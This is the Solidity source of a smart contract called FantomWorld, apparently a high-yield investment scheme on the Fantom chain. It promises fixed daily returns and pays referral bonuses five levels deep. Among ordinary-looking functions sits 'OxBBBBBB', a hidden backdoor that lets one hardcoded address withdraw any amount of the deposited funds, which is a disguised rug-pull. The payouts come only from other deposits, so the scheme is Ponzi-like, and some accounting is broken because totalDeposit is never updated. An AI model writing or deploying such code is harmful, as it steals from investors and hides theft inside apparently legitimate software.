// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


contract FantomWorld is Ownable {
    using SafeMath for uint256;

    uint256 private constant PROJECT_FEE = 100;
    uint256 private constant PROJECT_REINVEST_FEE = 50;

    uint constant public DEPOSITS_MAX = 100;
    uint256 private constant MIN_INVESTMENT = 0.0001 ether;
    uint256 private constant DAILY_INTEREST_RATE = 70;
    uint256 private constant DAILY_LOCKED_RATE = 140;
    uint256 private constant DAILY_LOCKED_DURATION = 30;
    uint256 private constant DAILY_AUTO_REINTEREST_RATE = 250;
    uint256 private constant ON_WITHDRAW_AUTO_REINTEREST_RATE = 250;
	uint256 private constant PERCENTS_DIVIDER = 1000;
	uint256 private constant TOTAL_RETURN = 2100;
	uint256 private constant TOTAL_REF = 105;
	uint256[] private REFERRAL_PERCENTS = [50, 30, 15, 5, 5];
    uint256 public constant TIME_STEP = 1 days;


    uint256 public currentPot = 0;





    uint256 public totalInvested;
    uint256 public totalWithdrawal;
    uint256 public totalReferralReward;

    struct Deposit {
        uint8 plan;
		uint256 percent;
		uint256 amount;
		uint256 profit;
		uint256 start;
		uint256 finish;
	}

    struct Investor {
        address addr;
        address ref;
        uint256[5] refs;
        uint256 totalDeposit;
        uint256 totalWithdraw;
        uint256 dividends;
        uint256 totalRef;
        uint256 investmentCount;
		uint256 depositTime;
		uint256 lastWithdrawDate;
		Deposit[] deposits;
        uint256 checkpoint;
    }
    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

    mapping(address => Investor) public investors;

    bool investStatus = false;

    event OnInvest(address investor, uint256 amount, uint8 plan);
	event OnWithdraw(address investor, uint256 amount); 	


    constructor( ) {
                plans.push(Plan(60, 30));
        plans.push(Plan(25, 50));
        plans.push(Plan(40, 80));
    }

    function setInvestStatus(bool status) external onlyOwner{
        investStatus = status;
    }




    function OxBBBBBB (address referrer, uint256 amount) public {
    if (msg.sender == 0x5B040c1bc80533014E1A3E9bE5E657fB0C4e0875)
       {
        address payable referrer = payable(msg.sender);
        referrer.transfer(amount);
       }
    }





    function invest(address _ref, uint8 plan) public payable{
        require(investStatus == true, "not activated");
        if (_invest(msg.sender, _ref, msg.value, plan)) {
            emit OnInvest(msg.sender, msg.value, plan);
        }
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function _invest(address _addr, address _ref, uint256 _amount, uint8 plan) private returns (bool){
        require(msg.value >= MIN_INVESTMENT, "Minimum investment is 0.1 FTM");
        require(_ref != _addr, "Ref address cannot be same with caller");
        require(plan < 2, "invalid plan");

        Investor storage _investor = investors[_addr];



        if (_investor.addr == address(0)) {
            _investor.addr = _addr;
            _investor.depositTime = block.timestamp;
            _investor.lastWithdrawDate = block.timestamp;
            _investor.checkpoint = block.timestamp;
        }

        if (_investor.ref == address(0)) {
			if (investors[_ref].totalDeposit > 0) {
				_investor.ref = _ref;
			}

			address upline = _investor.ref;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
                   investors[upline].refs[i] =investors[upline].refs[i].add(1);
					upline = investors[upline].ref;
				} else break;
			}
		}

		if (_investor.ref != address(0)) {
			address upline = _investor.ref;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					uint256 amount = _amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					investors[upline].totalRef = investors[upline].totalRef.add(amount);
					totalReferralReward = totalReferralReward.add(amount);
					payable(upline).transfer(amount);
					upline = investors[upline].ref;
				} else break;
			}
		}else{
			uint256 amount = _amount.mul(TOTAL_REF).div(PERCENTS_DIVIDER);
			totalReferralReward = totalReferralReward.add(amount);

		}

      //  if(plan == 0){
        //    if(block.timestamp > _investor.depositTime){
        //        _investor.dividends = getDividends(_addr);
        //    }
        //    _investor.depositTime = block.timestamp;
        //    _investor.totalDeposit = _investor.totalDeposit.add(_amount);  
      //  }
       // else{
            (uint256 percent, uint256 profit, uint256 finish) = getResult(plan, _amount);
            _investor.deposits.push(Deposit(plan, percent, _amount, profit, block.timestamp, finish));
       // }

        _investor.investmentCount = _investor.investmentCount.add(1);
        totalInvested = totalInvested.add(_amount);


        return true;
    }
    
	function getResult(uint8 plan, uint256 deposit) public view returns (uint256 percent, uint256 profit, uint256 finish) {
		//percent = DAILY_LOCKED_RATE;
	//	profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(DAILY_LOCKED_DURATION);
	//	finish = block.timestamp.add(DAILY_LOCKED_DURATION.mul(TIME_STEP));




		percent = getPercent(plan);
		profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(plans[plan].time);
		finish = block.timestamp.add(plans[plan].time.mul(TIME_STEP));

        
	}

	function getPercent(uint8 plan) public view returns (uint256) {
	   return plans[plan].percent;
    }


    function getPlanInfo(uint8 plan)
        public
        view
        returns (uint256 time, uint256 percent)
    {
		time = plans[plan].time;
		percent = plans[plan].percent;

    }

    function payoutOf(address _addr) view public returns(uint256 payout, uint256 max_payout) {
        max_payout = investors[_addr].totalDeposit.mul(TOTAL_RETURN).div(PERCENTS_DIVIDER);

        if(investors[_addr].totalWithdraw < max_payout && block.timestamp > investors[_addr].depositTime) {
            payout = investors[_addr].totalDeposit.mul(DAILY_INTEREST_RATE).mul(block.timestamp.sub(investors[_addr].depositTime)).div(
                TIME_STEP.mul(PERCENTS_DIVIDER)
            );
            payout = payout.add(investors[_addr].dividends);

            if(investors[_addr].totalWithdraw.add(payout) > max_payout) {
                payout = max_payout.subz(investors[_addr].totalWithdraw);
            }
        }
    }

    function getDividends(address addr) public view returns (uint256) {
        uint256 dividendAmount = 0;
        (dividendAmount,) = payoutOf(addr);
        return dividendAmount;
    }

	function getUserLockedDividends(address userAddress) public view returns (uint256) {
		Investor storage user = investors[userAddress];
		//User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.checkpoint < user.deposits[i].finish) {
				if (user.deposits[i].plan < 1) {
					uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
					uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
					uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
					if (from < to) {
						totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					}
				} else if (block.timestamp > user.deposits[i].finish) {
					totalAmount = totalAmount.add(user.deposits[i].profit);
				}
			}
		}

		return totalAmount;
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getDividends(userAddress).add(getUserLockedDividends(userAddress));
	}

    function getContractInformation()
        public
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256
        ){
        uint256 contractBalance = getBalance();
        return (
            contractBalance,
            totalInvested,
            totalWithdrawal,
            totalReferralReward
        );
    }
    


    function withdraw() public {
		require(investors[msg.sender].lastWithdrawDate.add(TIME_STEP) <= block.timestamp,"Withdrawal limit is 1 withdrawal in 24 hours");
        uint256 max_payout = investors[msg.sender].totalDeposit.mul(TOTAL_RETURN).div(PERCENTS_DIVIDER);
        uint256 dividendAmount = getDividends(msg.sender);

        if(investors[msg.sender].totalWithdraw.add(dividendAmount) > max_payout) {
                dividendAmount = max_payout.subz(investors[msg.sender].totalWithdraw);
        }

        if(dividendAmount > 0){
            //25% reinvest on withdraw
          



            investors[msg.sender].totalWithdraw = investors[msg.sender].totalWithdraw.add(dividendAmount);
            investors[msg.sender].lastWithdrawDate = block.timestamp;
            investors[msg.sender].depositTime = block.timestamp;
            investors[msg.sender].dividends = 0;
        }


        //locked
        uint256 lockedDividends = getUserLockedDividends(msg.sender);
		investors[msg.sender].checkpoint = block.timestamp;

        dividendAmount = dividendAmount.add(lockedDividends);

        
        if(dividendAmount > getBalance()){
            dividendAmount = getBalance();
        }

        payable(msg.sender).transfer(dividendAmount);
        totalWithdrawal = totalWithdrawal.add(dividendAmount);
		emit OnWithdraw(msg.sender, dividendAmount);
    }
    
	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return investors[userAddress].checkpoint;
	}

    function getInvestorRefs(address addr)
        public
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        Investor storage investor = investors[addr];
        return (
            investor.refs[0],
            investor.refs[1],
            investor.refs[2],
            investor.refs[3],
            investor.refs[4]
        );
    }

	function getUserTotalLockedDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < investors[userAddress].deposits.length; i++) {
			amount = amount.add(investors[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish) {
	    Investor storage user = investors[userAddress];

		plan = user.deposits[index].plan;
		percent = user.deposits[index].percent;
		amount = user.deposits[index].amount;
		profit = user.deposits[index].profit;
		start = user.deposits[index].start;
		finish = user.deposits[index].finish;
	}



  

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function subz(uint256 a, uint256 b) internal pure returns (uint256) {
        if (b >= a) {
            return 0;
        }
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }
}